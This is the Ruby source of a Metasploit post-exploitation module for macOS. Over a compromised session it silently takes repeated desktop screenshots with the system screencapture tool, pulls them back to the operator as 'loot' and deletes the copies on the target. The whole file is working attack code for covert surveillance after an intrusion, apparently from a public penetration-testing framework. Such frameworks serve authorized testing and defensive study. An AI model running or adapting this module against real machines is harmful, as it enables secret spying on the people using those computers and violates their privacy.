##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OSX Screen Capture',
        'Description'   => %q{
          This module takes screenshots of target desktop and automatically downloads them.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Peter Toth <globetother[at]gmail.com>' # ported windows version to osx
          ],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ 'meterpreter', 'shell' ]
      ))

    register_options(
      [
        OptEnum.new('FILETYPE',
          [true, 'File format to use when saving a snapshot', 'png', %w(png gif)]
        ),
        OptInt.new('DELAY', [true, 'Interval between screenshots in seconds. 0 for no delay', 10]),
        OptInt.new('COUNT', [true, 'Number of screenshots to collect.', 1]),
        OptString.new('TMP_PATH', [true, 'Path to remote temp directory', '/tmp/<random>']),
        OptString.new('EXE_PATH', [true, 'Path to remote screencapture executable', '/usr/sbin/screencapture'])
      ])

  end

  def run
    file_type = datastore['FILETYPE'].shellescape
    exe_path = datastore['EXE_PATH'].shellescape
    tmp_path = datastore['TMP_PATH'].gsub('<random>', Rex::Text.rand_text_alpha(8)).shellescape
    if datastore['COUNT'] < 1
      count = 1
    else
      count = datastore['COUNT']
    end
    if datastore['DELAY'] < 0
      delay = 0
    else
      delay = datastore['DELAY']
    end

    if not file?(exe_path)
      print_error("Aborting, screencapture binary not found.")
      return
    end

    print_status "Capturing #{count} screenshots with a delay of #{delay} seconds"
    # calculate a sane number of leading zeros to use.  log of x  is ~ the number of digits
    leading_zeros = Math::log10(count).round
    file_locations = []

    count.times do |num|
      Rex.sleep(delay) unless num <= 0

      begin
        # This is an OSX module, so mkdir -p should be fine
        cmd_exec("mkdir -p #{tmp_path}")
        filename = Rex::Text.rand_text_alpha(7)
        file = "#{tmp_path}/#{filename}"
        cmd_exec("#{exe_path} -x -C -t #{file_type} #{file}")
        data = read_file(file)
        file_rm(file)
      rescue ::Rex::Post::Meterpreter::RequestError => e
        print_error("Error taking the screenshot")
        vprint_error("#{e.class} #{e} #{e.backtrace}")
        return
      end

      unless data
        print_error("No data for screenshot #{num}")
        next
      end

      begin
        # let's loot it using non-clobbering filename, even tho this is the source filename, not dest
        fn = "screenshot.%0#{leading_zeros}d.#{file_type}" % num
        location = store_loot("screen_capture.screenshot", "image/#{file_type}", session, data, fn, "Screenshot")
        vprint_good("Screenshot #{num} saved on #{location}")
        file_locations << location
      rescue ::IOError, ::Errno::ENOENT => e
        print_error("Error storing screenshot")
        vprint_error("#{e.class} #{e} #{e.backtrace}")
        return
      end

    end

    print_status("Screen Capturing Complete")
    if file_locations and not file_locations.empty?
      print_status("Use \"loot -t screen_capture.screenshot\" to see file locations of your newly acquired loot")
    end

  end
end
